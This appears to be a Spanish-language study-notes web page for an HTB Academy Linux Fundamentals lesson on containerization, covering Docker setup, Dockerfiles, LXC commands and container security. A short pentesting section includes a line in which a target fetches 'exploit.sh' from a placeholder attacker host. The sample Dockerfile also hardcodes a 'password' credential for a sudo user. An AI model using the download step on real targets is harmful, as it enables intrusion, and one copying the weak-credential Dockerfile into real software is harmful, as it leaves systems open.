@@ -1,0 +1,322 @@
+<!DOCTYPE html><html lang="es"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="Linux Fundamentals - Containerization - HTB Challenge"><link rel="icon" type="image/svg+xml" href="/challenges/favicon.svg"><title>Linux Fundamentals - Containerization | HTB Challenge</title><link rel="stylesheet" href="/challenges/_astro/_slug_-DHZt47Ra.css">
+<style>.markdown-body{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;line-height:1.8;color:#e5e7eb}.markdown-body h1{font-size:2rem;font-weight:700;color:#f97316;margin:2rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid #374151}.markdown-body h2{font-size:1.5rem;font-weight:600;color:#22d3ee;margin:1.75rem 0 1rem;padding-bottom:.25rem}.markdown-body h3{font-size:1.25rem;font-weight:600;color:#a5f3fc;margin:1.5rem 0 .75rem}.markdown-body p{margin:.75rem 0;color:#d1d5db}.markdown-body strong{color:#fbbf24;font-weight:600}.markdown-body ul,.markdown-body ol{margin:.75rem 0;padding-left:1.5rem;color:#d1d5db}.markdown-body li{margin:.5rem 0;list-style-type:disc}.markdown-body table{width:100%;margin:1rem 0;border-collapse:collapse;font-size:.9rem}.markdown-body th,.markdown-body td{padding:.75rem;border:1px solid #374151;text-align:left}.markdown-body th{background:#37415180;color:#fbbf24;font-weight:600}.markdown-body td{color:#d1d5db}.markdown-body code{background:#06b6d426;color:#22d3ee;padding:.2rem .5rem;border-radius:.375rem;font-family:SF Mono,Monaco,Courier New,monospace;font-size:.875rem}.markdown-body pre{background:#0f172a;padding:1rem;border-radius:.75rem;overflow-x:auto;margin:1rem 0;border:1px solid #1e293b}.markdown-body pre code{background:transparent;padding:0;color:#a5b4fc}
+</style></head> <body class="bg-slate-950 text-gray-100 min-h-screen"> <header class="bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 border-b border-slate-800"> <nav class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4"> <nav class="flex mb-6" aria-label="Breadcrumb"> <ol class="flex items-center space-x-2"> <li class="flex items-center">  <a href="/challenges" class="text-cyan-400 hover:text-cyan-300 transition-colors"> Challenges </a> </li><li class="flex items-center"> <span class="text-gray-500 mx-2">/</span> <a href="/challenges/htb" class="text-cyan-400 hover:text-cyan-300 transition-colors"> HTB </a> </li><li class="flex items-center"> <span class="text-gray-500 mx-2">/</span> <span class="text-gray-300 font-medium">Linux Fundamentals - Containerization</span> </li> </ol> </nav> </nav> <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12"> <div class="flex items-center space-x-4 mb-4"> <span class="px-4 py-2 bg-gradient-to-r from-green-500 to-teal-600 rounded-full text-lg font-bold text-white">
+🎯
+</span> <span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">✅ Completado</span> <span class="px-3 py-1 bg-slate-700 rounded-full text-sm">⭐ easy</span> <span class="px-3 py-1 bg-slate-700 rounded-full text-sm">HTB Academy</span> </div> <h1 class="text-4xl font-bold text-white mb-2">Linux Fundamentals - Containerization</h1> <p class="text-gray-400">HTB Challenge</p> </div> </header> <main class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12"> <article class="prose prose-invert max-w-none"> <div class="bg-slate-900 rounded-xl border border-slate-800 p-8">  <div class="flex flex-wrap gap-2 mb-6"> <span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#linux</span><span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#docker</span><span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#containers</span><span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#lxc</span><span class="px-3 py-1 bg-green-500/20 text-green-400 rounded-full text-sm">#virtualization</span> </div> <div class="markdown-body"><h1>Linux Fundamentals - Containerization</h1>
+<h2>Objetivo</h2>
+<p>Entender los conceptos de containerización en Linux: Docker, LXC, y las diferencias con máquinas virtuales.</p>
+<hr>
+<h2>Conceptos Clave</h2>
+<h3>¿Qué es la Containerización?</h3>
+<p>La containerización es el proceso de empaquetar y ejecutar aplicaciones en entornos aislados llamados contenedores. Estos proporcionan:</p>
+<ul>
+<li><strong>Ligereza</strong>: Comparten el kernel del host</li>
+<li><strong>Consistencia</strong>: Mismo comportamiento en cualquier entorno</li>
+<li><strong>Aislamiento</strong>: Separación entre aplicaciones</li>
+<li><strong>Portabilidad</strong>: Fácil movimiento entre sistemas</li>
+</ul>
+<h3>Contenedores vs Máquinas Virtuales</h3>
+<table>
+<thead>
+<tr>
+<th>Aspecto</th>
+<th>Contenedores</th>
+<th>VMs</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Kernel</td>
+<td>Compartido con host</td>
+<td>Propio</td>
+</tr>
+<tr>
+<td>Recursos</td>
+<td>Mínimos</td>
+<td>Completo OS</td>
+</tr>
+<tr>
+<td>Inicio</td>
+<td>Segundos</td>
+<td>Minutos</td>
+</tr>
+<tr>
+<td>Aislamiento</td>
+<td>Namespace/cgroups</td>
+<td>Hypervisor</td>
+</tr>
+<tr>
+<td>Tamaño</td>
+<td>MB</td>
+<td>GB</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>Docker</h2>
+<h3>Instalación</h3>
+<pre><code class="language-bash">#!/bin/bash
+
+# Preparación
+sudo apt update -y
+sudo apt install ca-certificates curl gnupg lsb-release -y
+sudo mkdir -m 0755 -p /etc/apt/keyrings
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
+echo &quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null
+
+# Instalar Docker Engine
+sudo apt update -y
+sudo apt install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y
+
+# Agregar usuario al grupo docker
+sudo usermod -aG docker $USER
+
+# Probar instalación
+docker run hello-world
+</code></pre>
+<h3>Dockerfile Ejemplo</h3>
+<pre><code class="language-dockerfile"># Usar Ubuntu 22.04 como base
+FROM ubuntu:22.04
+
+# Instalar Apache y SSH
+RUN apt-get update &amp;&amp; \
+    apt-get install -y apache2 openssh-server &amp;&amp; \
+    rm -rf /var/lib/apt/lists/*
+
+# Crear usuario
+RUN useradd -m docker-user &amp;&amp; \
+    echo &quot;docker-user:password&quot; | chpasswd
+
+# Configurar permisos
+RUN chown -R docker-user:docker-user /var/www/html &amp;&amp; \
+    usermod -aG sudo docker-user
+
+# Exponer puertos
+EXPOSE 22 80
+
+# Iniciar servicios
+CMD service ssh start &amp;&amp; /usr/sbin/apache2ctl -D FOREGROUND
+</code></pre>
+<h3>Comandos Docker</h3>
+<pre><code class="language-bash"># Construir imagen
+docker build -t mi_imagen .
+
+# Ejecutar contenedor
+docker run -p 8022:22 -p 8080:80 -d mi_imagen
+
+# Listar contenedores
+docker ps
+
+# Detener contenedor
+docker stop &lt;container_id&gt;
+
+# Ver logs
+docker logs &lt;container_id&gt;
+
+# Eliminar contenedor
+docker rm &lt;container_id&gt;
+
+# Eliminar imagen
+docker rmi &lt;image_name&gt;
+</code></pre>
+<h3>Gestión de Contenedores</h3>
+<table>
+<thead>
+<tr>
+<th>Comando</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>docker ps</code></td>
+<td>Listar contenedores activos</td>
+</tr>
+<tr>
+<td><code>docker stop</code></td>
+<td>Detener contenedor</td>
+</tr>
+<tr>
+<td><code>docker start</code></td>
+<td>Iniciar contenedor detenido</td>
+</tr>
+<tr>
+<td><code>docker restart</code></td>
+<td>Reiniciar contenedor</td>
+</tr>
+<tr>
+<td><code>docker rm</code></td>
+<td>Eliminar contenedor</td>
+</tr>
+<tr>
+<td><code>docker rmi</code></td>
+<td>Eliminar imagen</td>
+</tr>
+<tr>
+<td><code>docker logs</code></td>
+<td>Ver logs del contenedor</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>Linux Containers (LXC)</h2>
+<h3>Instalación</h3>
+<pre><code class="language-bash">sudo apt install lxc -y
+</code></pre>
+<h3>Crear Contenedor LXC</h3>
+<pre><code class="language-bash"># Crear contenedor Ubuntu
+sudo lxc-create -n linuxcontainer -t ubuntu
+</code></pre>
+<h3>Comandos LXC</h3>
+<table>
+<thead>
+<tr>
+<th>Comando</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>lxc-ls</code></td>
+<td>Listar contenedores</td>
+</tr>
+<tr>
+<td><code>lxc-start -n &lt;name&gt;</code></td>
+<td>Iniciar contenedor</td>
+</tr>
+<tr>
+<td><code>lxc-stop -n &lt;name&gt;</code></td>
+<td>Detener contenedor</td>
+</tr>
+<tr>
+<td><code>lxc-restart -n &lt;name&gt;</code></td>
+<td>Reiniciar contenedor</td>
+</tr>
+<tr>
+<td><code>lxc-attach -n &lt;name&gt;</code></td>
+<td>Conectar al contenedor</td>
+</tr>
+<tr>
+<td><code>lxc-config -n &lt;name&gt; -s storage</code></td>
+<td>Gestionar storage</td>
+</tr>
+<tr>
+<td><code>lxc-config -n &lt;name&gt; -s network</code></td>
+<td>Gestionar red</td>
+</tr>
+<tr>
+<td><code>lxc-config -n &lt;name&gt; -s security</code></td>
+<td>Gestionar seguridad</td>
+</tr>
+</tbody></table>
+<h3>Configurar Recursos (cgroups)</h3>
+<pre><code class="language-bash"># Crear archivo de configuración
+sudo vim /usr/share/lxc/config/linuxcontainer.conf
+</code></pre>
+<pre><code>lxc.cgroup.cpu.shares = 512
+lxc.cgroup.memory.limit_in_bytes = 512M
+</code></pre>
+<pre><code class="language-bash"># Reiniciar servicio
+sudo systemctl restart lxc.service
+</code></pre>
+<hr>
+<h2>Docker vs LXC</h2>
+<table>
+<thead>
+<tr>
+<th>Aspecto</th>
+<th>Docker</th>
+<th>LXC</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Enfoque</td>
+<td>Aplicación</td>
+<td>Sistema</td>
+</tr>
+<tr>
+<td>Imágenes</td>
+<td>Dockerfile estándar</td>
+<td>Manual</td>
+</tr>
+<tr>
+<td>Portabilidad</td>
+<td>Alta (Docker Hub)</td>
+<td>Menor</td>
+</tr>
+<tr>
+<td>Facilidad</td>
+<td>Simple</td>
+<td>Más técnico</td>
+</tr>
+<tr>
+<td>Seguridad</td>
+<td>Más aislado por defecto</td>
+<td>Requiere configuración</td>
+</tr>
+</tbody></table>
+<hr>
+<h2>Seguridad en Contenedores</h2>
+<h3>Riesgos</h3>
+<ul>
+<li>Escape de contenedor</li>
+<li>Escalada de privilegios</li>
+<li>Acceso al host</li>
+</ul>
+<h3>Medidas de Seguridad</h3>
+<ol>
+<li>Restringir acceso al contenedor</li>
+<li>Limitar recursos (cgroups)</li>
+<li>Aislar del host</li>
+<li>Enforce mandatory access control</li>
+<li>Mantener actualizado</li>
+</ol>
+<hr>
+<h2>Casos de Uso en Pentesting</h2>
+<h3>Entorno de Pruebas</h3>
+<pre><code class="language-bash"># Crear contenedor vulnerable
+docker run -d -p 80:80 vulnerables/web-app
+</code></pre>
+<h3>Transferencia de Archivos</h3>
+<pre><code class="language-bash"># Servidor de archivos
+docker run -p 8080:80 -v /path/to/files:/usr/share/nginx/html nginx
+
+# En target
+wget http://atacante:8080/exploit.sh
+</code></pre>
+<hr>
+<h2>Lecciones Aprendidas</h2>
+<ol>
+<li><strong>Docker</strong>: Plataforma de containers enfocada en aplicaciones</li>
+<li><strong>LXC</strong>: Containers a nivel de sistema, más flexibles</li>
+<li><strong>Stateless</strong>: Cambios en contenedor se pierden al detener</li>
+<li><strong>Volúmenes</strong>: Para persistir datos</li>
+<li><strong>Seguridad</strong>: Contenedores no son VMs, menor aislamiento</li>
+</ol>
+<hr>
+<h2>Referencias</h2>
+<ul>
+<li><a href="https://docs.docker.com/">Docker Documentation</a></li>
+<li><a href="https://linuxcontainers.org/">LXC Documentation</a></li>
+<li><a href="https://hub.docker.com/">Docker Hub</a></li>
+</ul>
+<hr>
+<h2>Estado</h2>
+<p><strong>COMPLETADO</strong> ✓</p>
+<ul>
+<li>Fecha: 2026-02-20</li>
+<li>Módulo: Linux Fundamentals</li>
+<li>Sección: 23 - Containerization</li>
+<li>Tipo: Teoría</li>
+</ul>
+</div> </div> </article> <div class="mt-8 flex justify-between items-center"> <a href="/challenges/htb/" class="px-6 py-3 bg-slate-700 hover:bg-slate-600 rounded-lg transition-colors">
+← Volver
+</a> <button onclick="openModal('linux-fundamentals/containerization')" class="px-6 py-3 bg-gradient-to-r from-green-500 to-teal-600 hover:from-green-600 hover:to-teal-700 rounded-lg transition-all font-medium flex items-center gap-2 shadow-lg shadow-green-500/25"> <span>📋</span> <span>Ver Solución Paso a Paso</span> </button> </div> </main> <div id="modal-linux-fundamentals/containerization" class="fixed inset-0 bg-black bg-opacity-50 hidden z-50" aria-hidden="true"> <div class="flex items-center justify-center min-h-screen p-4"> <div class="bg-slate-800 rounded-lg max-w-4xl w-full max-h-[90vh] overflow-y-auto"> <div class="p-6 border-b border-slate-700"> <div class="flex justify-between items-start"> <div> <h2 class="text-2xl font-bold text-gray-100">Linux Fundamentals - Containerization</h2> <div class="flex items-center gap-4 mt-2 text-sm"> <span class="capitalize bg-slate-700 px-2 py-1 rounded">htb</span> <span class="text-cyan-400">easy</span>  </div> </div> <button onclick="closeModal('linux-fundamentals/containerization')" class="text-gray-400 hover:text-white">
+✕
+</button> </div> </div> <div class="p-6"> <div class="mb-6"> <h3 class="text-lg font-semibold text-cyan-400 mb-4">Pasos a Seguir</h3> <div class="mb-4"> <h4 class="font-medium text-gray-200 mb-2">1. Comandos de Solución</h4> <pre class="bg-slate-900 p-3 rounded text-sm text-green-400 mb-2 overflow-x-auto">
+
+                    <code>sudo apt update -y
+sudo apt install ca-certificates curl gnupg lsb-release -y
+sudo mkdir -m 0755 -p /etc/apt/keyrings
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
+echo &quot;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable&quot; | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null
+sudo apt update -y
+sudo apt install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin -y
+sudo usermod -aG docker $USER
+docker run hello-world</code>
+                  </pre>  </div> </div> <div class="mb-6"> <h3 class="text-lg font-semibold text-yellow-400 mb-4">Verificación</h3> <ul class="space-y-2"> <li class="flex items-center text-gray-300"> <span class="text-green-400 mr-2">✓</span> Reto completado </li><li class="flex items-center text-gray-300"> <span class="text-green-400 mr-2">✓</span> Puntuación obtenida </li> </ul> </div>   </div> </div> </div> </div> <script type="module">document.addEventListener("click",e=>{const t=e.target;t.classList.contains("bg-black")&&(t.classList.add("hidden"),t.setAttribute("aria-hidden","true"))});</script> <footer class="border-t border-slate-800 mt-16"> <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 text-center text-gray-500 text-sm"> <p>Technical Challenges Repository | HTB Challenge</p> </div> </footer> <script type="module">function e(d){const o=document.getElementById(`modal-${d}`);o&&(o.classList.remove("hidden"),document.body.style.overflow="hidden")}function n(d){const o=document.getElementById(`modal-${d}`);o&&(o.classList.add("hidden"),document.body.style.overflow="")}window.openModal=e;window.closeModal=n;</script> </body> </html>
